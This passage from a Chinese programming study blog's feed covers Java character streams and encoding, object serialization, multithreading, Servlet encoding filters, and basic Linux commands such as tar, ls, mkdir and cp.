-27, -101, -67]        byte[] bys = s.getBytes(&quot;GBK&quot;); //[-42, -48, -71, -6]        System.out.println(Arrays.toString(bys));        //String ss = new String(bys);        //String ss = new String(bys,&quot;UTF-8&quot;);        String ss = new String(bys,&quot;GBK&quot;);        System.out.println(ss);    &#125;&#125;</code></pre><p><strong>3、字符流中的编码解码问题</strong>：</p><p>字符流中和编码解码的两个类：</p><ul><li><p>InputStreamReader：是从字节流到字符流的桥梁，它读取字节，并使用指定的编码将其解码为字符<br>它使用的字符集可以由名称指定，也可以接受平台的默认字符集。</p></li><li><p>OutputStreamWriter：是从字符流到字节流的桥梁，使用指定的编码将写入的字符编码为字节它使用的字符集可以由名称指定，也可以接受平台的默认字符集。</p></li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200917195607516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>示例代码：</p><pre><code class="java">public class ConversionStreamDemo &#123;    public static void main(String[] args) throws IOException &#123;        //OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(&quot;myCharStream\\osw.txt&quot;));        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(&quot;myCharStream\\osw.txt&quot;),&quot;GBK&quot;);        osw.write(&quot;中国&quot;);        osw.close();        //InputStreamReader isr = new InputStreamReader(new FileInputStream(&quot;myCharStream\\osw.txt&quot;));        InputStreamReader isr = new InputStreamReader(new FileInputStream(&quot;myCharStream\\osw.txt&quot;),&quot;GBK&quot;);        //一次读取一个字符数据        int ch;        while ((ch=isr.read())!=-1) &#123;            System.out.print((char)ch);        &#125;        isr.close();    &#125;&#125;</code></pre><p><strong>4、字符流写数据的5种方式</strong>：</p><p>方法介绍：</p><p><img src="https://img-blog.csdnimg.cn/20200917201539934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>刷新和关闭的方法：</p><p><img src="https://img-blog.csdnimg.cn/20200917201740807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br> 刷新流作用：刷新缓冲，写入数据。</p><p><strong>5、字符流读数据的2种方式</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200917201836496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>6、字符缓冲流</strong>：</p><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200920163849290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>7、字符缓冲流特有功能</strong>：</p><p>BufferedWriter：</p><p>写一个换行符，由操作系统系统决定。<br><img src="https://img-blog.csdnimg.cn/20200920165440690.png#pic_center"></p><p>BufferedReader:</p><p><img src="https://img-blog.csdnimg.cn/20200920165500154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>8、字符缓冲流特有功能复制Java文件</strong>：</p><p>代码实现：</p><pre><code class="java">public class CopyJavaDemo02 &#123;    public static void main(String[] args) throws IOException &#123;        //根据数据源创建字符缓冲输入流对象        BufferedReader br = new BufferedReader(new FileReader(&quot;myCharStream\\ConversionStreamDemo.java&quot;));        //根据目的地创建字符缓冲输出流对象        BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;myCharStream\\Copy.java&quot;));        //读写数据，复制文件        //使用字符缓冲流特有功能实现        String line;        while ((line=br.readLine())!=null) &#123;            bw.write(line);            bw.newLine();//换行            bw.flush();        &#125;        //释放资源        bw.close();        br.close();    &#125;&#125;</code></pre><p><strong>9、IO流小结</strong>：</p><p> 字节流：<br><img src="https://img-blog.csdnimg.cn/202009201715519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><blockquote><p>字节流可以复制任意文件数据，一般采用字节缓冲流一次读写一个字节数组的方式</p></blockquote><p>字符流：</p><p><img src="https://img-blog.csdnimg.cn/20200920171620468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><blockquote><p> 字符流只能复制文本数据，一般使用字符缓冲流。</p></blockquote><h4 id="25、IO特殊操作流"><a href="#25、IO特殊操作流" class="headerlink" title="25、IO特殊操作流"></a>25、IO特殊操作流</h4><p><strong>1、标准输入流</strong>：</p><p><strong>System</strong> 类中有两个静态的成员变量</p><ul><li><p>public static final InputStream in：标准输入流。通常该流对应于键盘输入或由主机环境或用户指定的另一个输入源。(InputStream是返回值类型 in是方法，可以直接由类直接调用)</p></li><li><p>public static final PrintStream out：标准输出流。通常该流对应于显示输出或由主机环境或用户指定的另一个输出目标。</p></li></ul><p>自己实现键盘录入数据:</p><pre><code class="java">BufferedReader br = new BufferedReader(new InputStreamReader(System.in));</code></pre><p>写起来太麻烦，Java就提供了一个类实现键盘录入:</p><pre><code class="java">Scanner sc = new Scanner(System.in);</code></pre><p> <strong>2、对象序列化流</strong>：</p><p>对象序列化介绍：</p><ul><li><p>对象序列化：就是将对象保存到磁盘中，或者在网络中传输对象；</p></li><li><p>这种机制就是使用一个字节序列表示一个对象，该字节序列包含：对象的类型、对象的数据和对象中存储的属性等信息。</p></li><li><p>字节序列写到文件之后，相当于文件中持久保存了一个对象的信息；反之，该字节序列还可以从文件中读取回来，重构对象，对它进行反序列化</p></li></ul><p>对象序列化流： ObjectOutputStream</p><ul><li>将Java对象的原始数据类型和图形写入OutputStream。 可以使用ObjectInputStream读取（重构）对象。 可以通过使用流的文件来实现对象的持久存储。 如果流是网络套接字流，则可以在另一个主机上或另一个进程中重构对象。</li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923232605414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>序列化对象的方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923232625425.png#pic_center"><br>示例代码：</p><p>学生类</p><pre><code class="java">public class Student implements Serializable &#123;    private String name;    private int age;    public Student() &#123;    &#125;    public Student(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class ObjectOutputStreamDemo &#123;    public static void main(String[] args) throws IOException &#123;    //ObjectOutputStream(OutputStream out)：创建一个写入指定的OutputStream的ObjectOutputStream    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;myOtherStream\\oos.txt&quot;));    //创建对象    Student s = new Student(&quot;林青霞&quot;,30);    //void writeObject(Object obj)：将指定的对象写入ObjectOutputStream    oos.writeObject(s);    //释放资源    oos.close();    &#125;&#125;</code></pre><p>注意事项：</p><ol><li>一个对象要想被序列化，该对象所属的类必须必须实现Serializable 接口</li><li>Serializable是一个标记接口，实现该接口，不需要重写任何方法</li></ol><p><strong>3、对象反序列化流</strong>：</p><p>对象反序列化流： ObjectInputStream</p><ul><li>ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象</li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923234533475.png#pic_center"><br>反序列化对象的方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923234606377.png#pic_center"><br>示例代码：</p><pre><code class="java">public class ObjectInputStreamDemo &#123;    public static void main(String[] args) throws IOException,ClassNotFoundException &#123;    //ObjectInputStream(InputStream in)：创建从指定的InputStream读取的ObjectInputStream    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;myOtherStream\\oos.txt&quot;));    //Object readObject()：从ObjectInputStream读取一个对象    Object obj = ois.readObject();    Student s = (Student) obj;    System.out.println(s.getName() + &quot;,&quot; + s.getAge());    ois.close();    &#125;&#125;</code></pre><h4 id="26、多线程"><a href="#26、多线程" class="headerlink" title="26、多线程"></a>26、多线程</h4><p><strong>1、进程和线程</strong>：</p><p>进程：是正在运行的程序</p><ul><li>是系统进行资源分配和调用的独立单位</li><li>每一个进程都有它自己的内存空间和系统资源</li></ul><p>线程：是进程中的单个顺序控制流，是一条执行路径</p><ul><li>单线程：一个进程如果只有一条执行路径，则称为单线程程序</li><li>多线程：一个进程如果有多条执行路径，则称为多线程程序</li></ul><p><strong>2、实现多线程方式一：继承Thread类</strong></p><p>方法介绍：</p><p><img src="https://img-blog.csdnimg.cn/20200926171541923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>实现步骤：</p><ol><li>定义一个类MyThread继承Thread类</li><li>在MyThread类中重写run()方法</li><li>创建MyThread类的对象</li><li>启动线程</li></ol><p>例：</p><pre><code class="java">public class MyThread extends Thread &#123;    @Override    public void run() &#123;        for (int i = 0; i &lt; 100; i++) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class ThreadTest &#123;    public static void main(String[] args) &#123;        MyThread my1 = new MyThread();        MyThread my2 = new MyThread();        //void start() 导致此线程开始执行; Java虚拟机调用此线程的run方法        my1.start();        my2.start();    &#125;&#125;</code></pre><p>两个小问题：</p><p>为什么要重写run()方法？</p><ul><li>因为run()是用来封装被线程执行的代码</li></ul><p>run()方法和start()方法的区别？</p><ul><li>run()：封装线程执行的代码，直接调用，相当于普通方法的调用</li><li>start()：启动线程；然后由JVM调用此线程的run()方法</li></ul><p><strong>3、设置和获取线程名称</strong>：</p><p><img src="https://img-blog.csdnimg.cn/2020092617461151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>例：</p><p>获取main方法的线程名</p><pre><code class="java">public class ThreadTest &#123;    public static void main(String[] args) &#123;        System.out.println(Thread.currentThread().getName());    &#125;&#125;</code></pre><p><strong>4、线程优先级</strong>：</p><p>线程调度：</p><p>两种调度方式</p><ul><li>分时调度模型：所有线程轮流使用 CPU 的使用权，平均分配每个线程占用 CPU 的时间片。</li><li>抢占式调度模型：优先让优先级高的线程使用 CPU，如果线程的优先级相同，那么会随机选择一个，优先级高的线程获取的 CPU 时间片相对多一些。（Java使用的是抢占式调度模型）</li></ul><p>优先级相关方法：</p><p><img src="https://img-blog.csdnimg.cn/20200926180041158.png"><br>默认优先级为5</p><p><strong>5、线程控制</strong>：</p><p>相关方法：</p><p><img src="https://img-blog.csdnimg.cn/20200926180724781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>6、线程的生命周期</strong>：<br><img src="https://img-blog.csdnimg.cn/20200926182530650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>7、实现多线程方式二：实现Runnable接口</strong></p><p>Thread构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200927175751162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>实现步骤：</p><ol><li>定义一个类MyRunnable实现Runnable接口</li><li>在MyRunnable类中重写run()方法</li><li>创建MyRunnable类的对象</li><li>创建Thread类的对象，把MyRunnable对象作为构造方法的参数</li><li>启动线程</li></ol><p>例：</p><pre><code class="java">public class MyRunnable implements Runnable &#123;    @Override    public void run() &#123;        for(int i=0; i&lt;100; i++) &#123;            System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i);        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class MyRunnableDemo &#123;    public static void main(String[] args) &#123;        //创建MyRunnable类的对象        MyRunnable my = new MyRunnable();        //创建Thread类的对象，把MyRunnable对象作为构造方法的参数        //Thread(Runnable target)        // Thread t1 = new Thread(my);        // Thread t2 = new Thread(my);        //Thread(Runnable target, String name)        Thread t1 = new Thread(my,&quot;高铁&quot;);        Thread t2 = new Thread(my,&quot;飞机&quot;);        //启动线程        t1.start();        t2.start();    &#125;&#125;</code></pre><p>总结：</p><p>多线程的实现方案有两种:</p><ul><li>继承Thread类</li><li>实现Runnable接口</li></ul><p>相比继承Thread类，实现Runnable接口的好处:</p><ul><li>避免了Java单继承的局限性</li><li>适合多个相同程序的代码去处理同一个资源的情况，把线程和程序的代码、数据有效分离，较好的体现了面向对象的设计思想。<hr></li></ul><p>🆗，关于java的基础知识总结就到这里了，后面会接着学习Java EE 的 SpringMVC+Mybates框架。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下tar命令简介</title>
      <link href="2020/09/28/Linux%E4%B8%8Btar%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B/"/>
      <url>2020/09/28/Linux%E4%B8%8Btar%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>总结一下Linux中tar命令的用法。<hr/><br><strong>tar命令的参数：</strong></p><ol><li>这五个参数是独立的和别的命令连用时只能使用其中一个。<br>```</li></ol><p>-c: 创建一个打包文件(create)<br>-x：解压<br>-t：查看内容<br>-r：向压缩归档文件末尾追加文件<br>-u：更新原压缩包中的文件</p><pre><code>2. 根据需要在压缩或解压档案时可选参数。</code></pre><p>-z: 使用zip进行解压或压缩<br>-j: 使用bzip2进行解压或压缩<br>-v: 压缩的过程中显示文件<br>-f: 必须命令，用于指定文件名；这个参数必须是最后一个参数且后面只能文件名！<br>-Z：有compress属性的（这个不常见）</p><pre><code>**范例：**1. 查看`tar -tf a.tar.gz`   在不解压的情况下查看压缩包的内容2. 仅打包 `tar -cvf a.tar /etc`   把/etc目录下的所有文件打包，不压缩！3. 压缩 `tar -zcvf a.tar.gz /etc`    打包后，以 gzip 格式压缩`tar -jcvf a.tar.bz2 /etc`  打包后，以 bzip2 格式压缩4. 解压`tar –xvf a.tar` 解压 tar包`tar -xzvf a.tar.gz` 解压tar.gz`tar -xjvf a.tar.bz2` 解压 tar.bz2`tar –xZvf file.tar.Z` 解压tar.Z🆗，以上就是tar命令常用的选项了。</code></pre>]]></content>
      
      
      <categories>
          
          <category> Liunx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> liunx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet过滤器——Filter</title>
      <link href="2020/09/28/Java%20web%E2%80%94Servlet%E8%BF%87%E6%BB%A4%E5%99%A8(Filter)/"/>
      <url>2020/09/28/Java%20web%E2%80%94Servlet%E8%BF%87%E6%BB%A4%E5%99%A8(Filter)/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>过滤器是Servlet中一个非常重要的组成部分，进行WEB开发时无不用到过滤器；因此这篇blog来单独总结下关于过滤器的知识点。<hr/></p><h6 id="一、首先来了解一下什么是过滤器："><a href="#一、首先来了解一下什么是过滤器：" class="headerlink" title="一、首先来了解一下什么是过滤器："></a>一、首先来了解一下什么是过滤器：</h6><p><a href="https://www.cnblogs.com/xdp-gacl/p/3948353.html">下面这句话引自这篇文章</a><br>　　Filte即过滤器，它是Servlet技术中最激动人心的技术，WEB开发人员通过Filter技术，对web服务器管理的<strong>所有web资源</strong>：例如Jsp, Servlet, 静态图片文件或静态 html 文件等进行拦截，从而实现一些特殊的功能。例如实现URL级别的权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。<br>　　Servlet API中提供了一个Filter接口，如果编写的Java类实现了这个接口，则把这个java类称之为过滤器Filter。通过Filter技术，开发人员可以实现用户在访问某个目标资源之前，对访问的请求和响应进行拦截，如下：<br>　　<img src="https://img-blog.csdnimg.cn/20200422000020988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="二、Filter特点："><a href="#二、Filter特点：" class="headerlink" title="二、Filter特点："></a>二、Filter特点：</h5><ul><li>Servlet过滤器可以检查和修改ServletRequest和ServletResponse对象。</li><li>Servlet过滤器可以被指定和特定的URL关联，且不能独立执行，只有当客户请求访问该URL时，才会触发过滤器。</li><li>Servlet过滤器可以被串联在一起，形成管道效应，协同修改请求和响应对象（过滤器链）。<br><img src="https://img-blog.csdnimg.cn/20200422001954640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h5 id="三、过滤器的实现："><a href="#三、过滤器的实现：" class="headerlink" title="三、过滤器的实现："></a>三、过滤器的实现：</h5>建立一个过滤器涉及下列五个步骤:</li></ul><ol><li>建立一个实现Filter接口的类；</li><li>在doFilter方法中实现过滤行为；</li><li>调用FilterChain对象的doFilter方法；</li><li>对相应的servlet和JSP页面注册过滤器；</li><li>禁用激活器servlet；</li></ol><p><strong>1、建立一个实现Filter接口的类</strong>：</p><ul><li>Servlet过滤器类必须实现javax.servlet.Filter</li><li>这个接口含有3个过滤器类必须实现的方法：</li></ul><pre><code class="java">    init( )    doFilter( )    destroy( )</code></pre><ul><li><code>public void init(FilterConfig config)   thows ServletException</code>只在此过滤器第一次初始化时执行</li><li>简单过滤器可提供此方法的空体，两种情况使用init:</li></ul><ol><li>FilterConfig对象提供对servlet环境及web.xml文件中指派的过滤器名的访问。利用init将FilterConfig对象存放在一个字段中，以便doFilter方法能够访问servlet环境或过滤器名。</li><li>FilterConfig对象具有一个getInitParameter方法，它能够访问部署描述符文件（web.xml）中分配的过滤器初始化参数。 </li></ol><p><strong>2、在doFilter方法中实现过滤行为：</strong></p><ul><li>重要方法：<pre><code class="java">   public void doFilter(ServletRequset request, ServletResponse response,FilterChain chain)   </code></pre></li></ul><p><strong>3、调用FilterChain对象的doFilter方法：</strong></p><ul><li>最后一个参数FilterChain对象。对此对象调用以激活与servlet或JSP相关的下一个过滤器。如果没有另一个相关的过滤器，则对doFilter的调用激活servlet或JSP本身</li></ul><p><strong>4、对相应的servlet和JSP页面注册过滤器：</strong></p><ul><li>web.xml中用于过滤器的元素:<br><code>filter</code>：元素向系统注册一个过滤对象<br><code>filter-mapping</code>：元素指定该过滤对象所应用的URL<br><code>&lt;filter-name&gt;</code>必需元素，必须与用filter元素声明时给予过滤器的名称相匹配<br><code>&lt;url-pattern&gt;</code>必需元素，此元素声明一个以斜杠<code>&quot;/&quot;</code>开始的模式，它指定过滤器应用的URL。</li></ul><p><strong>例：</strong><br>要求：利用filter和filter-mapping指示名为SomeFilter的过滤器应用到名为SomeServlet的servlet。</p><p>web.xml应配置为：</p><pre><code class="java">&lt;filter&gt;   &lt;filter-name&gt;SomeFilter&lt;/filter-name&gt;   &lt;filter-class&gt;sPackage.SFilterClass&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;SomeFilter&lt;/filter-name&gt;   &lt;servlet-name&gt;SomeServlet&lt;/servlet-name&gt;&lt;/filter-mapping&gt;</code></pre><p><strong>5、禁用激活器servlet：</strong></p><ul><li>在对资源应用过滤器时，可通过指定要应用过滤器的URL模式或servlet名来完成。</li><li>如果提供servlet名，则此名称必须与web.xml的servlet元素中给出的名称相匹配。</li><li>如果使用应用到一个serlvet的URL模式，则此模式必须与利用web.xml的元素servlet-mapping指定的模式相匹配。</li><li>防止用户利用缺省servlet URL绕过过滤器设置 。</li></ul><h5 id="四、对请求信息的过滤："><a href="#四、对请求信息的过滤：" class="headerlink" title="四、对请求信息的过滤："></a>四、对请求信息的过滤：</h5><p>对请求信息的过滤大致分为下列5个步骤：</p><ol><li>Servlet容器创建一个过滤器实例。</li><li>过滤器实例调用init方法，读取过滤器初始化参数。</li><li>过滤器实例调用doFilter方法，根据初始化参数的值判断该请求是否合法。</li><li>如果该请求不合法则阻塞该请求。</li><li>如果该请求合法则调用chain.doFilter方法将该请求向后续传递。 </li></ol><p>因为Servlet对中文支持不好，用户提交的表单信息会产生乱码问题，会给后台的数据查询和记录（数据库存储）等功能造成影响，因此需要对请求信息进行转码。</p><p> <strong>解决方法一：</strong><br> 直接在Servlet中转码</p><p>处理get请求：：</p><pre><code class="java">    String name = request.getParameter(param_name);    name = new String( name.getBytes(&quot;ISO8859_1&quot;) );</code></pre><p>处理post请求：</p><pre><code class="java">request.setCharacterEncoding(&quot;utf-8&quot;);</code></pre><p>直接在servlet里处理的缺点是从request中取出的每个中文变量都要转换，且不能动态的改变编码。</p><p> <strong>解决方法二：</strong><br>在过滤器中进行转码，且在一个动态web项目里设置完成后就可以不用在单个Servlet中一一设置了。<br><strong>例：</strong><br>Filter类：</p><pre><code class="java">public class MyFilter  implements Filter&#123;  private String tarEncoding = &quot;gb2312&quot;;    protected FilterConfig filterConfig;    public void init(FilterConfig config) throws ServletException     &#123;   this.filterConfig = config;            this.tarEncoding =    config.getInitParameter(&quot;encoding&quot;);      &#125;        public void doFilter( ServletRequest srequest, ServletResponse sresponse, FilterChain chain) throws IOException, ServletException     &#123;    HttpServletRequest request =   (HttpServletRequest)srequest;    HttpServletResponse response = (HttpServletResponse)sresponse;    //把请求用指定的方式编码         request.setCharacterEncoding(targetEncoding);  //把响应用指定的方式编码    response.setCharacterEncoding(targetEncoding);  // 把处理发送到下一个过滤器         chain.doFilter(srequest,sresponse);     &#125;        public void destroy()     &#123;    this.filterConfig=null; &#125;     &#125;</code></pre><p>过滤器部署描述：</p><pre><code class="java">&lt;filter&gt;    &lt;filter-name&gt;encod&lt;/filter-name&gt;    &lt;filter-class&gt;pdsu.edu.cn.chu.MyFilter&lt;/filter-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;encoding&lt;/param-name&gt;        &lt;param-value&gt;gb2312&lt;/param-value&gt;    &lt;/init-param&gt; &lt;/filter&gt;&lt;filter-mapping&gt;     &lt;filter-name&gt;encod&lt;/filter-name&gt;      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;filter-mapping&gt;</code></pre><p>过滤器只能解决Post提交的中文乱码问题，Get提交中文乱码解决方法为：  </p><p>修改tomcat配置文件下的server.xml，找到对8080端口进行服务的Connector组件的设置部分，为Connector添加属性<code>URIEncoding=&quot;GBK&quot;</code><br><img src="https://img-blog.csdnimg.cn/20200422215757800.png" alt="在这里插入图片描述"></p><h5 id="五、对响应信息的过滤："><a href="#五、对响应信息的过滤：" class="headerlink" title="五、对响应信息的过滤："></a>五、对响应信息的过滤：</h5><ol><li>过滤器截获客户端的请求.</li><li>重新封装ServletResponse，在封装后的ServletResponse中提供用户自定义的输出流；即：<br><img src="https://img-blog.csdnimg.cn/20200422221449696.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li><li>将请求向后续传递。</li><li>Web组件产生响应。</li><li>从封装后的ServletResponse中获取用户自定义的输出流。</li><li>将响应内容通过用户自定义的输出流写入到缓冲流。</li><li>在缓冲流中修改响应的内容后清空缓冲流，输出响应内容。</li></ol><p>🆗，关于Filter的总结暂时就这么多。 =￣ω￣=</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaweb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux操作系统总结</title>
      <link href="2020/01/10/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BB%93/"/>
      <url>2020/01/10/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="Linux的基本指令"><a href="#Linux的基本指令" class="headerlink" title="Linux的基本指令"></a>Linux的基本指令</h3><h4 id="一、基础指令"><a href="#一、基础指令" class="headerlink" title="一、基础指令:"></a>一、基础指令:</h4><h5 id="1、ls指令"><a href="#1、ls指令" class="headerlink" title="1、ls指令:"></a>1、ls指令:</h5><ul><li><p>用法1：ls<br>含义：列出当前工作目录下的所有文件/文件夹的名称</p></li><li><p>用法2：ls 路径<br>含义：列出指定路径下的所有文件/文件夹的名称</p></li></ul><blockquote><p>路径可以分为两种：相对路径、绝对路径。<br>相对路径的写法：在相对路径中通常会用到2个符号<code>&quot;./&quot;</code>(表示当前目录下)、<code>&quot;../&quot;</code>(上一级目录)<br>绝对路径：绝对路径不需要参照物，直接从根<code>&quot;/&quot;</code>开始寻找对应路径。</p></blockquote><ul><li>用法3：ls [选项] 路径<br>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。</li></ul><p>常见的语法：</p><ul><li>ls -l 路径：以详细列表的形式进行展示</li><li>ls -la 路径：显示所有的文件/文件夹（包含了隐藏文件/文件夹）</li><li>ls -lh 路径：以列表的形式并且在显示文档大小的时候以可读性较高的形式显示。<br><img src="https://img-blog.csdnimg.cn/2c19c3ef5cec4ec3a5161bec75a8d202.png"><br><img src="https://img-blog.csdnimg.cn/46657a841b9544bbb853cb6b756c7521.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>上述列表中的第一列字符表示文档的类型，其中<code>&quot;-&quot;</code>表示该行对应的文档类型为文件，<code>&quot;d&quot;</code>表示文档类型为文件夹，隐藏文档一般都是以<code>&quot;.&quot;</code>开头。<br><img src="https://img-blog.csdnimg.cn/c7d15ccc6a6a420598072ca085cf54c3.png"><h5 id="2、pwd指令"><a href="#2、pwd指令" class="headerlink" title="2、pwd指令:"></a>2、pwd指令:</h5>用法：pwd（print working directory，打印当前工作目录）<h5 id="3、cd指令："><a href="#3、cd指令：" class="headerlink" title="3、cd指令："></a>3、cd指令：</h5>命令：cd（change directory，改变目录）</li></ul><p>只输入<code>cd</code>，切换到当前用户的家目录。</p><h5 id="4、mkdir指令："><a href="#4、mkdir指令：" class="headerlink" title="4、mkdir指令："></a>4、mkdir指令：</h5><p>用法1：mkdir 路径 （可以是文件夹名称也可以是包含名称的一个完整路径）</p><p>例：在指定路径下创建出一个文件夹test</p><pre><code class="bash">mkdir /home/test</code></pre><p>用法2：mkdir -p 路径</p><p>含义：当一次性创建多层不存在的目录的时候，添加<code>-p</code>参数，否则会报错<br><img src="https://img-blog.csdnimg.cn/c5dcd013922b45b583a652fed8f8ac48.png"><br>用法3：mkdir 路径1 路径2 路径3 …（表示一次性创建多个目录）<br><img src="https://img-blog.csdnimg.cn/d82dd4bcf5c6400c9946a3c3c8f7c05c.png"></p><h5 id="5、touch指令："><a href="#5、touch指令：" class="headerlink" title="5、touch指令："></a>5、touch指令：</h5><p>作用：创建文件<br>语法：touch 文件路径（路径可以是直接的文件名也可以是路径）</p><p>例：在当前路径下创建一个文件，命名为Linux.txt</p><pre><code class="bash">touch linux.txt</code></pre><p>例：同时创建多个文件</p><pre><code class="bash">touch linux1.txt linux2.txt</code></pre><p>例：用户家目录中创建文件，linux.txt</p><pre><code class="bash">touch /home/smk/linux.txt</code></pre><h5 id="6、cp指令："><a href="#6、cp指令：" class="headerlink" title="6、cp指令："></a>6、cp指令：</h5><p>作用：复制文件/文件夹到指定的位置<br>语法：cp 被复制的文档路径 文档被复制到的路径</p><p>例：使用 cp 命令来复制一个文件<br><img src="https://img-blog.csdnimg.cn/68aa0c3f87dc40c99cc09f1a0eb99b4f.png"><br>注：在复制过程中可以对新位置的文件进行重命名，但如果不是必要，建议保持前后名称一致。</p><p>例：使用 cp 命令来复制一个文件夹<br><img src="https://img-blog.csdnimg.cn/5e6f5da691d34d7b9a6167e32b51e86d.png"><br>注：当使用 cp 命令进行文件夹复制操作的时候需要添加选项<code>&quot;-r&quot;</code>（-r表示递归复制），否则目录将被忽略。</p><h5 